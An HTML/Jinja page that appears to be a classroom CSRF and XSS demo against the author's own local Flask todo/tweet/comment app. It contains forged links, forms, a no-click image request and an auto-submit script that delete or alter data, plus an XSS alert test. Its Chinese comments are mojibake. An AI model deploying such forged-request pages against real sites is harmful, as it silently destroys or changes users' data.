<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF</title>
</head>
<body>
<img src="http://p5shjfo1t.bkt.clouddn.com/hack.jpg">
<!--ç”¨æˆ·ä¸ç‚¹å‡»ä¹Ÿä¸­æ‹›-->
<!--<img src="http://0.0.0.0:4000/todo/delete/3">-->
<!--é€šè¿‡cookieï¼Œå†ä¼ªé€ requeståˆ é™¤/addç”¨æˆ·æ•°æ®-->

<h3>test todo</h3>
<a href="http://0.0.0.0:4000/todo/edit/7">
    ç‚¹å‡»editçº¢åŒ…
</a>
<br>
<a href="http://0.0.0.0:4000/todo/delete/7">
    ç‚¹å‡»deleteçº¢åŒ…
</a>


<form action="http://0.0.0.0:4000/todo/add" method="post">
    <input type="text" value="from hack add" name="title" placeholder="è¯·è¾“å…¥todo">
    <br>
    <button id="add" type="submit">ç‚¹å‡»addçº¢åŒ…</button>
</form>

<form action="http://0.0.0.0:4000/todo/update" method="post">
    <input name="id" placeholder="id" value="7">
    <br>
    <input type="text" value="from hack update" name="title" placeholder="è¯·è¾“å…¥todo">
    <br>
    <button id="update" type="submit">ç‚¹å‡»updateçº¢åŒ…</button>
</form>
    <br>
    <a href="http://0.0.0.0:4000/todo/status_switch/9?status=True">è®¾ç½®ä¸º-å®Œæˆ</a>
    <a href="http://0.0.0.0:4000/todo/status_switch/9?status=False">è®¾ç½®ä¸º-æœªå®Œæˆ</a>


<h3>test tweet</h3>

<a href="http://0.0.0.0:4000/tweet/edit/4">
    ç‚¹å‡»editçº¢åŒ…
</a>
<br>
<a href="http://0.0.0.0:4000/tweet/delete/4">
    ç‚¹å‡»deleteçº¢åŒ…
</a>

<br>
<a href="http://0.0.0.0:4000/tweet/new">
    ç‚¹å‡»å»newçº¢åŒ…
</a>
<br>
<form action="http://0.0.0.0:4000/tweet/add" method="post">
        <input name="content">
        <br>
        <button type="submit">ç‚¹å‡»addçº¢åŒ…</button>
</form>

<form action="http://0.0.0.0:4000/tweet/update" method="post">
    <input name="id" value="4" type="hidden">
    <input name="content">
    <button type="submit">ç‚¹å‡»updateçº¢åŒ…</button>
</form>

<h3>test comment</h3>

<a href="http://0.0.0.0:4000/comment/delete/6">ç‚¹å‡»deleteçº¢åŒ…</a>
<br>
<a href="http://0.0.0.0:4000/comment/edit/6">ç‚¹å‡»editçº¢åŒ…</a>
<br>
<form action="http://0.0.0.0:4000/comment/update" method="post">
    <input name="id" value="6" type="hidden">
    <input name="content" value="from hack again">
    <button type="submit">ç‚¹å‡»updateçº¢åŒ…</button>
</form>
<br>
 <form action="http://0.0.0.0:4000/comment/add" method="post">
            <input type="hidden" name="tweet_id" value="5">
            <input name="content">
            <br>
            <button type="submit">ç‚¹å‡»addçº¢åŒ…</button>
</form>

<script>
    {#è‡ªåŠ¨æäº¤#}
    {#è¿™æ˜¯jinjaæ¨¡æ¿çš„æ³¨é‡ŠğŸ˜¥#}

    {#let e = function(sel) {#}
    {#    return document.querySelector(sel)#}
    {#}#}
    {##}
    {#e('#add').click()#}
</script>

</body>
</html>

{#XSS#}
{#<script>alert('hello')</script>#}
{#æ‰“å¼€safeæ¨¡å¼,addå¦‚ä¸Štodoï¼Œä¼šè¢«æ‰§è¡ŒXSSè„šæœ¬,
XSSå¯ä»¥æœ‰å¾ˆå¤šç§:æ”¹èƒŒæ™¯é¢œè‰²å•¦ï¼Œ
å·cookie(flaské»˜è®¤åšäº†å®‰å…¨é˜²èŒƒï¼Œjsä»£ç ä¸èƒ½æ‹¿åˆ°cookieï¼Œä½†æ˜¯çŸ¥ä¹å°±å¯ä»¥)#}
{#<h3>{{ t.id }} : {{ t.title | safe}}#}
{#ä¸æ‰“å¼€safeæ¨¡å¼<>ç¬¦å·ä¼šè¢«&lt; &gt;ä»£æ›¿#}
